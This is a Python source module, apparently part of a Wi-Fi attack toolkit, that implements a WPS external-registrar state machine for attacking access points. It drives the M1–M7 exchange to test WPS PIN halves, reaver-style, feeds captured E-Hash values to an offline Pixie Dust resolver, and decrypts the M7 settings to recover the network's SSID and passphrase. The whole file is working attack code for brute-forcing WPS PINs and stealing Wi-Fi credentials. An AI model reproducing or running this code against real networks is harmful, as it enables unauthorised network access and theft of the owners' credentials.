"""WpsRegistrar: the per-PIN EAP/WSC state machine (transport-agnostic).

Drives one PIN attempt as an external WPS Registrar against an Enrollee (the
AP). Knows nothing about USB: it is handed a transport with
``send_until_ack``/``send_no_wait`` + ``recv(timeout)`` and builds/parses full 802.11
data frames via ``messages``. The live adapter (``auth_assoc.WlanTransport``) wires
this to ``WlanInterface.send_until_ack``/``send_no_wait`` + ``register_rx_callback``;
tests wire it to an in-process fake enrollee.

The PIN halves, decided by what arrives after each message we send:

    after M4 :  M5  -> first half correct      NACK/EAP-FAIL/timeout -> FIRST_HALF_WRONG
    after M6 :  M7  -> SUCCESS (extract PSK)    NACK/EAP-FAIL/timeout -> SECOND_HALF_WRONG

Timeout-as-NACK (reaver's default for the M5/M7 waits) lets the sweep advance
against APs that silently drop instead of NACKing.
"""

from __future__ import annotations

import asyncio
import inspect
import logging
import os
import time
from dataclasses import dataclass
from enum import Enum
from typing import Any, Callable, Optional, Protocol

from wifit3.campaigns.wps.pixie import PixieBundle
from wifit3.dot11.deauth import reason_description
from wifit3.dot11.wsc import messages as M
from wifit3.dot11.wsc import crypto as wc

logger = logging.getLogger(__name__)


class WpsTransport(Protocol):
    async def send_until_ack(self, frame: bytes, max_retries: int = 0) -> bool: ...
    async def send_no_wait(self, frame: bytes) -> bool: ...
    async def recv(self, timeout: float) -> Optional[bytes]: ...


class PinResult(Enum):
    SUCCESS = "success"
    FIRST_HALF_WRONG = "first_half_wrong"
    SECOND_HALF_WRONG = "second_half_wrong"
    TIMEOUT = "timeout"
    PROTO_ERROR = "proto_error"           # rejected before the M4 answer (e.g. locked)
    ABORTED = "aborted"                   # cooperatively stopped mid-exchange (user Stop)


@dataclass
class AttemptOutcome:
    result: PinResult
    pin: str = ""
    psk: Optional[str] = None             # Network Key recovered from M7, on SUCCESS
    ssid: Optional[str] = None
    detail: str = ""
    config_error: Optional[int] = None    # WSC ATTR_CONFIG_ERROR from a NACK: the AP's stated reason
    reached_m1: bool = False              # did the AP start the WSC exchange (send M1) at all?
    via_timeout: bool = False             # result inferred from silence (timeout-as-NACK), not a real NACK
    refused: bool = False                 # AP actively refused external-registrar WPS (disassoc /
    #                                       persistent identity-stall), NOT mere silence
    pixie: PixieBundle | None = None
    identity_reqs: int = 0
    eapol_resends: int = 0
    ack_failures: int = 0
    stage: str = "assoc"
    had_encrypted_settings: bool = False
    decrypt_ok: Optional[bool] = None
    m4_sent: bool = False
    status_code: str = ""

    @property
    def first_half_ok(self) -> bool:
        return self.result in (PinResult.SECOND_HALF_WRONG, PinResult.SUCCESS)


# WSC Config Error codes (WSC spec, ATTR_CONFIG_ERROR): surfaced from a NACK so a
# failure says *why*, not just "refused". 15 = the AP is telling us it's locked; 18 is
# the closest thing to "wrong/rejected PIN". Which code(s) actually mean "advance past
# this PIN" is AP-dependent and confirmed from hardware before we key advancement off it.
WSC_CONFIG_ERRORS = {
    0: "No Error", 1: "OOB Interface Read Error", 2: "Decryption CRC Failure",
    3: "2.4GHz chan not supported", 4: "5GHz chan not supported", 5: "Signal too weak",
    6: "Network auth failure", 7: "Network assoc failure", 8: "No DHCP response",
    9: "Failed DHCP config", 10: "IP address conflict", 11: "Couldn't reach Registrar",
    12: "Multiple PBC sessions", 13: "Rogue activity suspected", 14: "Device busy",
    15: "Setup Locked", 16: "Message Timeout", 17: "Registration Session Timeout",
    18: "Device Password Auth Failure",
}


def config_error_name(code: Optional[int]) -> str:
    if code is None:
        return "none"
    return WSC_CONFIG_ERRORS.get(code, f"unknown(0x{code:02x})")


# After this many EAP-Req/Identity with no M1, the AP is "stuck at identity".
_IDENTITY_STALL = 8


def disassoc_reason(frame: bytes) -> str:
    """Reason code (name) from a disassoc/deauth frame body, or '?' if too short."""
    if len(frame) < 26:
        return "?"
    code = int.from_bytes(frame[24:26], "little")
    return reason_description(code)

# 802.11 management subtypes, so the WPS trace can name a frame the AP sends us but that
# isn't WSC (a DISASSOC/DEAUTH = the AP kicking us; the rest are the assoc handshake).
_MGMT_SUBTYPES = {
    0: "assoc-req", 1: "assoc-resp", 2: "reassoc-req", 3: "reassoc-resp", 4: "probe-req",
    5: "probe-resp", 8: "beacon", 9: "atim", 10: "DISASSOC", 11: "auth", 12: "DEAUTH", 13: "action",
}


def describe_frame(frame: bytes) -> str:
    """A short human name for a raw 802.11 frame (FC byte only): for the WPS conversation
    trace, so a non-WSC reply (disassoc, data flood) is legible instead of silently dropped."""
    if len(frame) < 1:
        return "empty"
    fc0 = frame[0]
    ftype = (fc0 >> 2) & 0x3
    subtype = (fc0 >> 4) & 0xf
    if ftype == 0:
        return f"mgmt/{_MGMT_SUBTYPES.get(subtype, subtype)}"
    if ftype == 1:
        return f"ctrl/{subtype}"
    if ftype == 2:
        return "data" if subtype < 8 else "qos-data"
    return f"?/{ftype}.{subtype}"


class WpsRegistrar:
    def __init__(
        self,
        transport: WpsTransport,
        bssid: bytes,
        our_mac: bytes,
        channel: int,
        wsc_2_0: bool,
        msg_timeout: float = 3.0,
        eapol_start_timeout: float = 7.0,
        overall_timeout: float = 25.0,
        max_resends: int = 2,
        eapol_max_resends: Optional[int] = None,
        tx_ack: bool = False,
        ack_resends: int = 0,
        should_stop: Optional[Callable[[], bool]] = None,
        is_associated: Optional[Callable[[], bool]] = None,
        log=None,
    ):
        # Polled right after every RX wait so a user Stop / AP-switch aborts the exchange within
        # one recv window, instead of blocking up to overall_timeout on a chatty AP.
        self.should_stop = should_stop
        self.is_associated = is_associated
        self.t = transport
        self.bssid = bssid
        self.our_mac = our_mac
        self.rf_bands = M.rf_band_for_channel(channel)
        self.wsc_2_0 = wsc_2_0
        # Per-message receive window. A cheap AP can take seconds to compute the
        # next WSC message (DH ≈ 1.2s measured; M1 up to ~3.4s on the AirLink), so
        # these are deliberately generous. A window shorter than the AP's real
        # latency causes premature resends that confuse the exchange.
        self.msg_timeout = msg_timeout
        self.eapol_start_timeout = eapol_start_timeout
        self.overall_timeout = overall_timeout
        # In-session resend: our injected frames land no-ACK/no-retry (wcid=0xff), so a
        # dropped M2/M4/M6 (or our M4 never reaching the AP) stalls the exchange. On a
        # per-stage timeout, resend the LAST frame in the SAME session (no MAC rotation) up
        # to this many times before conceding. The budget refreshes each time the AP replies.
        self.max_resends = max_resends
        self.eapol_max_resends = eapol_max_resends
        # tx_ack: each M-frame waits for the AP's ACK and resends up to ack_resends times
        # before moving on, instead of shot-and-prayed.
        self.tx_ack = tx_ack
        self.ack_resends = ack_resends
        self.log = log or logger.info
        self._last_1x_frame: Optional[bytes] = None
        self._ack_failures: int = 0

    async def _send_1x(self, payload_1x: bytes) -> None:
        frame = M.build_data_frame(self.bssid, self.our_mac, self.bssid, payload_1x)
        self._last_1x_frame = frame
        if self.tx_ack:
            landed = await self.t.send_until_ack(frame, max_retries=self.ack_resends)
            if landed is False:
                self._ack_failures += 1
                self.log(f"[WPS] -> frame un-ACKed after {self.ack_resends + 1} sends (AP not hearing us)")
        else:
            await self.t.send_no_wait(frame)

    async def try_pin(
        self,
        pin: Optional[str] = None,
        pin_resolver: Optional[Callable[[PixieBundle], Any]] = None,
        resolver_timeout: float = 9.0,
    ) -> AttemptOutcome:
        """Run one full EAPOL-Start->M1..M7 exchange for ``pin`` or a deferred ``pin_resolver``."""
        if pin is None and pin_resolver is None:
            raise ValueError("either pin or pin_resolver must be provided")

        # Fresh per-attempt session state.
        priv, pkr = wc.dh_generate_keypair()
        nonce_r = os.urandom(wc.NONCE_LEN)
        uuid_r = os.urandom(16)
        r_s1 = os.urandom(wc.SECRET_NONCE_LEN)
        r_s2 = os.urandom(wc.SECRET_NONCE_LEN)

        pke = nonce_e = mac_e = authkey = keywrapkey = psk1 = psk2 = pixie = None
        last_sent: Optional[str] = None         # 'M4' or 'M6': which answer we're waiting on
        # Highest WSC message type handled. WSC never runs backward, so a
        # received message older than this is a stale (no-ACK) retransmit. We
        # answer the *current* stage (retry insurance) but ignore older ones,
        # rather than re-emitting a stale M2 after we've moved on to M4.
        highest_mt = 0
        reached_m1 = False           # did the AP send M1 (WSC exchange actually started)?
        resends_left = self.eapol_max_resends if self.eapol_max_resends is not None else self.max_resends
        self._last_1x_frame = None
        self._ack_failures = 0
        identity_reqs = 0            # count EAP-Req/Identity: detect the "stuck at identity" stall
        eapol_resends = 0
        stage = "assoc"
        m4_sent = False
        nonwsc_seen: set = set()    # distinct non-WSC frame kinds the AP sent (logged once each)

        def _out(result: PinResult, **kw) -> AttemptOutcome:
            # Every outcome carries reached_m1 and diagnostics so the caller can distinguish
            # silence / no_m1 from real AP PIN rejection or M7 credential edge cases.
            return AttemptOutcome(
                result,
                pin or "",
                reached_m1=reached_m1,
                pixie=pixie,
                identity_reqs=identity_reqs,
                eapol_resends=eapol_resends,
                ack_failures=self._ack_failures,
                stage=stage,
                m4_sent=m4_sent,
                **kw,
            )

        await self._send_1x(M.eapol_start())
        self.log("[WPS] -> EAPOL-Start")

        # We answer every retransmit of the CURRENT stage as delivery insurance; the
        # stale-message guard below drops retransmits of stages we have already passed.
        overall_deadline = time.monotonic() + self.overall_timeout
        timeout = self.eapol_start_timeout
        while time.monotonic() < overall_deadline:
            remaining = overall_deadline - time.monotonic()
            if remaining <= 0:
                break
            frame = await self.t.recv(min(timeout, remaining))
            if self.should_stop is not None and self.should_stop():
                return _out(PinResult.ABORTED, detail="stopped", status_code="aborted")
            timeout = self.eapol_start_timeout if not reached_m1 else self.msg_timeout
            if frame is None:
                # No reply in the window. Our injected frames land no-ACK/no-retry, so the
                # likeliest cause is a dropped frame (our last one never reached the AP, or
                # the AP's reply was lost). Resend the last frame in-session (no MAC
                # rotation) before inferring anything from the silence.
                if resends_left > 0 and self._last_1x_frame is not None:
                    resends_left -= 1
                    eapol_resends += 1
                    self.log(f"[WPS] no reply (last_sent={last_sent or 'start'}): resending "
                             f"in-session ({resends_left} left)")
                    await self.t.send_no_wait(self._last_1x_frame)
                    continue
                # Resends exhausted. After M4/M6 a silent drop is a half-wrong verdict
                # (reaver's timeout-as-NACK); an explicit NACK (logged above, config_error
                # set) is a real rejection. If a correct first half ever reads as wrong via
                # THIS line, the AP's M5 was lost, not refused.
                if last_sent == "M4":
                    self.log("[WPS] no reply after M4 → assuming first-half-wrong "
                             "(timeout-as-NACK; an M5 may have been lost)")
                    return _out(PinResult.FIRST_HALF_WRONG, detail="no reply after M4",
                                via_timeout=True, status_code="rejected")
                if last_sent == "M6":
                    self.log("[WPS] no reply after M6 → assuming second-half-wrong "
                             "(timeout-as-NACK)")
                    return _out(PinResult.SECOND_HALF_WRONG, detail="no reply after M6",
                                via_timeout=True, status_code="rejected")
                if identity_reqs >= _IDENTITY_STALL:
                    return _out(PinResult.TIMEOUT, refused=True,
                                detail=f"stalled at ID {identity_reqs}x, no M1",
                                status_code="no_m1")
                if not reached_m1:
                    return _out(PinResult.TIMEOUT, detail="no reply to M1", status_code="no_m1")
                awaiting = "M3" if highest_mt == M.WPS_M1 else None
                return _out(PinResult.TIMEOUT,
                            detail=f"no reply to {awaiting}" if awaiting else "no reply",
                            status_code="timeout")

            p = M.parse_rx_frame(frame)
            if p is None:
                # Not WSC. Log what the AP actually sent (once per kind) so a non-WSC reply is
                # legible instead of silently dropped: a mgmt DISASSOC/DEAUTH is the AP kicking
                # us off; an unparsable EAPOL is a possibly-malformed M-message; a data flood is
                # the AP treating us as an associated client (IPv6/ARP/etc., not WPS).
                kind = describe_frame(frame)
                is_eapol = M.LLC_SNAP_EAPOL in frame
                if is_eapol or kind not in nonwsc_seen:
                    nonwsc_seen.add(kind)
                    tag = f"UNPARSED EAPOL/{kind}" if is_eapol else kind
                    extra = (f" reason={disassoc_reason(frame)}"
                             if kind in ("mgmt/DISASSOC", "mgmt/DEAUTH") else "")
                    self.log(f"[WPS] <- {tag}{extra} from AP ({len(frame)}B): {frame[:56].hex()}")
                if kind in ("mgmt/DISASSOC", "mgmt/DEAUTH"):
                    # The association is gone: resending into it only earns more
                    # class-2/3 kicks, and no PIN verdict can be read off a dead link.
                    # Before M1 this is the AP refusing an external registrar outright.
                    return _out(PinResult.TIMEOUT, refused=not reached_m1,
                                detail=f"{kind.removeprefix('mgmt/').lower()} "
                                       f"({disassoc_reason(frame)})",
                                status_code="no_m1" if not reached_m1 else "session_dropped")
                continue

            if p.is_identity_request:
                if highest_mt == 0:          # ignore identity retransmits once WSC starts
                    identity_reqs += 1
                    if identity_reqs == 1:
                        self.log(f"[WPS] <- EAP-Req/Identity (id {p.eap_id}); -> Identity response")
                    elif identity_reqs == _IDENTITY_STALL:
                        self.log(f"[WPS] AP re-requested Identity {identity_reqs}x without reaching "
                                 f"M1. It may require a link-layer ACK we don't send (auto-ACK); "
                                 f"still answering")
                    await self._send_1x(M.eap_identity_response(p.eap_id))
                continue

            if p.is_eap_failure or p.wsc_msg_type == M.WPS_WSC_NACK:
                # De-swallow the AP's stated reason. A NACK is the AP *answering* with a
                # config-error code (≠ silence); a timeout is "AP didn't respond".
                ce_raw = p.attrs.get(M.ATTR_CONFIG_ERROR)
                config_error = (int.from_bytes(ce_raw[:2], "big")
                                if ce_raw and len(ce_raw) >= 2 else None)
                kind = "EAP-FAIL" if p.is_eap_failure else "WSC_NACK"
                self.log(f"[WPS] <- {kind} config_error={config_error_name(config_error)} "
                         f"(last_sent={last_sent})")
                status = "locked" if config_error == 15 else ("rejected" if last_sent in ("M4", "M6") or reached_m1 else "no_m1")
                if last_sent == "M4":
                    return _out(PinResult.FIRST_HALF_WRONG, detail="NACK after M4",
                                config_error=config_error, status_code=status)
                if last_sent == "M6":
                    return _out(PinResult.SECOND_HALF_WRONG, detail="NACK after M6",
                                config_error=config_error, status_code=status)
                # An EAP-Failure before M1 is the AP's authenticator refusing an
                # external registrar (locked / no AP PIN), not an in-protocol NACK.
                return _out(PinResult.PROTO_ERROR, detail=f"{kind} before PIN answer",
                            config_error=config_error,
                            refused=p.is_eap_failure and not reached_m1,
                            status_code=status)

            mt = p.wsc_msg_type
            if mt and mt < highest_mt:
                # Stale retransmit of a stage we've already passed. Surfaced because a real
                # M5 (0x05) dropped here would read as a false first-half-wrong.
                self.log(f"[WPS] <- stale msg_type=0x{mt:02x} (< 0x{highest_mt:02x}), "
                         f"dropping (last_sent={last_sent})")
                continue
            if mt in (M.WPS_M1, M.WPS_M3, M.WPS_M5, M.WPS_M7):
                highest_mt = mt
                resends_left = self.max_resends   # AP advanced a stage → fresh resend budget
            if mt == M.WPS_M1:
                reached_m1 = True        # the AP is talking WSC, whatever happens next
                stage = "m1"
                pke = p.attrs.get(M.ATTR_PUBLIC_KEY)
                nonce_e = p.attrs.get(M.ATTR_ENROLLEE_NONCE)
                mac_e = p.attrs.get(M.ATTR_MAC_ADDR, self.bssid)
                if not pke or not nonce_e:
                    return _out(PinResult.PROTO_ERROR, detail="M1 missing PKe/nonce",
                                status_code="proto_error")
                shared = wc.dh_shared_secret(pke, priv)
                authkey, keywrapkey, _ = wc.derive_keys(shared, nonce_e, mac_e, nonce_r)
                if pin is not None:
                    psk1, psk2 = wc.derive_psk(authkey, pin)
                m2 = M.build_m2(nonce_e, nonce_r, uuid_r, pkr, authkey, p.raw_wsc_attrs,
                                self.rf_bands, self.wsc_2_0)
                await self._send_1x(M.eap_wsc_response(p.eap_id, M.WSC_MSG, m2))
                self.log(f"[WPS] <- M1 (id {p.eap_id}, {len(p.raw_wsc_attrs)}B); -> M2")

            elif mt == M.WPS_M3:
                stage = "m3"
                if authkey is None:
                    return _out(PinResult.PROTO_ERROR, detail="M3 before keys",
                                status_code="proto_error")
                e_hash1 = p.attrs.get(M.ATTR_E_HASH1)
                e_hash2 = p.attrs.get(M.ATTR_E_HASH2)
                if e_hash1 and e_hash2:
                    pixie = PixieBundle(pke, pkr, e_hash1, e_hash2, nonce_e, authkey, mac_e)
                if pin is None:
                    if (
                        pixie is None
                        or len(e_hash1 or b"") != wc.HASH_LEN
                        or len(e_hash2 or b"") != wc.HASH_LEN
                    ):
                        try:
                            nack = M.build_wsc_nack(nonce_e, nonce_r)
                            await self._send_1x(M.eap_wsc_response(p.eap_id, M.WSC_NACK, nack))
                        except Exception:
                            pass
                        return _out(
                            PinResult.PROTO_ERROR,
                            detail="M3 missing valid E-Hash1/E-Hash2",
                            status_code="pin_not_found_in_session",
                        )

                    resolved_pin: Optional[str] = None
                    try:
                        maybe = pin_resolver(pixie)
                        if inspect.isawaitable(maybe):
                            resolved_pin = await asyncio.wait_for(maybe, timeout=resolver_timeout)
                        else:
                            resolved_pin = maybe
                    except asyncio.TimeoutError:
                        self.log("[WPS] pin_resolver timed out before M4; sending WSC_NACK (M4 not sent)")
                        try:
                            nack = M.build_wsc_nack(nonce_e, nonce_r)
                            await self._send_1x(M.eap_wsc_response(p.eap_id, M.WSC_NACK, nack))
                        except Exception:
                            pass
                        return _out(
                            PinResult.PROTO_ERROR,
                            detail="pin_not_found_in_session (resolver timeout)",
                            status_code="pin_not_found_in_session",
                        )
                    except Exception as exc:
                        self.log(f"[WPS] pin_resolver error ({exc}); sending WSC_NACK (M4 not sent)")
                        try:
                            nack = M.build_wsc_nack(nonce_e, nonce_r)
                            await self._send_1x(M.eap_wsc_response(p.eap_id, M.WSC_NACK, nack))
                        except Exception:
                            pass
                        return _out(
                            PinResult.PROTO_ERROR,
                            detail=f"pin_not_found_in_session ({exc})",
                            status_code="pin_not_found_in_session",
                        )

                    if not resolved_pin or not (str(resolved_pin).isdigit() and len(str(resolved_pin)) in (4, 8)):
                        self.log("[WPS] offline search found no PIN in session; sending WSC_NACK (M4 not sent)")
                        try:
                            nack = M.build_wsc_nack(nonce_e, nonce_r)
                            await self._send_1x(M.eap_wsc_response(p.eap_id, M.WSC_NACK, nack))
                        except Exception:
                            pass
                        return _out(
                            PinResult.PROTO_ERROR,
                            detail="pin_not_found_in_session",
                            status_code="pin_not_found_in_session",
                        )

                    pin = str(resolved_pin)
                    if self.is_associated is not None and not self.is_associated():
                        self.log("[WPS] AP dropped association during PIN search (M4 not sent)")
                        return _out(
                            PinResult.TIMEOUT,
                            detail="session dropped before M4",
                            status_code="session_dropped",
                        )
                    psk1, psk2 = wc.derive_psk(authkey, pin)
                    # Give M4..M7 full response budget after offline solve.
                    min_remaining = self.msg_timeout * (self.max_resends + 2) + 8.0
                    overall_deadline = max(overall_deadline, time.monotonic() + min_remaining)

                m4 = M.build_m4(nonce_e, r_s1, r_s2, psk1, psk2, pke, pkr,
                                authkey, keywrapkey, p.raw_wsc_attrs, self.wsc_2_0)
                await self._send_1x(M.eap_wsc_response(p.eap_id, M.WSC_MSG, m4))
                last_sent = "M4"
                m4_sent = True
                stage = "m4"
                self.log(f"[WPS] <- M3 (id {p.eap_id}); -> M4 (revealing R-S1, testing first half)")

            elif mt == M.WPS_M5:
                # First half accepted. Reveal R-S2 in M6 to test the second half.
                stage = "m6"
                m6 = M.build_m6(nonce_e, r_s2, authkey, keywrapkey, p.raw_wsc_attrs,
                                self.wsc_2_0)
                await self._send_1x(M.eap_wsc_response(p.eap_id, M.WSC_MSG, m6))
                last_sent = "M6"
                self.log(f"[WPS] <- M5 (id {p.eap_id}) -> first half CORRECT; -> M6 (testing second half)")

            elif mt == M.WPS_M7:
                stage = "m7"
                ssid, psk, had_enc, decrypt_ok, status_code = self._extract_psk_detailed(
                    p, keywrapkey, authkey
                )
                if psk:
                    self.log(f"[WPS] <- M7 (id {p.eap_id}) -> SUCCESS; PSK=*** (len={len(psk)})")
                else:
                    self.log(f"[WPS] <- M7 (id {p.eap_id}) -> {status_code}")
                # Tear the session down politely (best-effort).
                nack = M.build_wsc_nack(nonce_e, nonce_r)
                await self._send_1x(M.eap_wsc_response(p.eap_id, M.WSC_NACK, nack))
                return _out(
                    PinResult.SUCCESS,
                    psk=psk,
                    ssid=ssid,
                    detail=status_code,
                    had_encrypted_settings=had_enc,
                    decrypt_ok=decrypt_ok,
                    status_code=status_code,
                )

            else:
                # M2D or unexpected: treat as a setup rejection (often a lock).
                if mt == M.WPS_M2D:
                    return _out(PinResult.PROTO_ERROR, detail="M2D (AP has no registrar)",
                                status_code="rejected")
                self.log(f"[WPS] <- unexpected msg_type=0x{mt:02x}, ignoring")
                continue

        if last_sent == "M4":
            return _out(PinResult.FIRST_HALF_WRONG, detail="no reply after M4 (overall timeout)",
                        via_timeout=True, status_code="rejected")
        if last_sent == "M6":
            return _out(PinResult.SECOND_HALF_WRONG, detail="no reply after M6 (overall timeout)",
                        via_timeout=True, status_code="rejected")
        if not reached_m1:
            return _out(PinResult.TIMEOUT, detail="no reply to M1 (overall timeout)",
                        status_code="no_m1")
        return _out(PinResult.TIMEOUT, detail="no reply (stalled)", status_code="timeout")

    @staticmethod
    def _extract_psk_detailed(p, keywrapkey, authkey: Optional[bytes] = None):
        enc = p.attrs.get(M.ATTR_ENCR_SETTINGS)
        if not enc:
            return None, None, False, None, "pin_ok_no_credential"
        if keywrapkey is None:
            return None, None, True, False, "decrypt_failed"
        try:
            creds = M.extract_m7_credentials(enc, keywrapkey, authkey=authkey)
        except Exception:
            return None, None, True, False, "decrypt_failed"
        if creds is None:
            return None, None, True, False, "decrypt_failed"
        ssid_b = creds.get("ssid")
        key_b = creds.get("network_key")
        ssid = ssid_b.decode("utf-8", "replace") if ssid_b else None
        psk = key_b.decode("utf-8", "replace") if key_b else None
        if not psk:
            return ssid, None, True, True, "pin_ok_no_credential"
        return ssid, psk, True, True, "psk_ok"

    @staticmethod
    def _extract_psk(p, keywrapkey, authkey: Optional[bytes] = None):
        ssid, psk, _, _, _ = WpsRegistrar._extract_psk_detailed(p, keywrapkey, authkey)
        return ssid, psk
